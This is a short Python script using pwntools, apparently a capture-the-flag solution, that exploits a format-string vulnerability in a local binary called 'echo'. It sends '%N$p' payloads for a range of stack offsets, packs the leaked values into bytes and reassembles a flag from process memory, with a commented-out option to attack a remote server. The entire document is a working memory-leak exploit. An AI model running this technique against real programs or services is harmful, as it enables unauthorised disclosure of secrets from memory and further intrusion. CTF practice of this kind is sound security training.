#!/usr/bin/python3
from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF("./echo", checksec=False)
#libc = ELF("/tmp/libc6_2.27-0ubuntu3_i386.so", checksec=False)

p = process()
#p = remote()

flag = b""
for i in range(27, 40):
    payload = f"%{i}$p"
    p.sendlineafter(b"> ", payload.encode())
    leak = p.recvline().strip()
    log.info(f"Leak {payload}: {leak}")
    flag += p32(int(leak, 16))

    if b"}" in flag:
        log.success(flag.decode())
        exit(0)
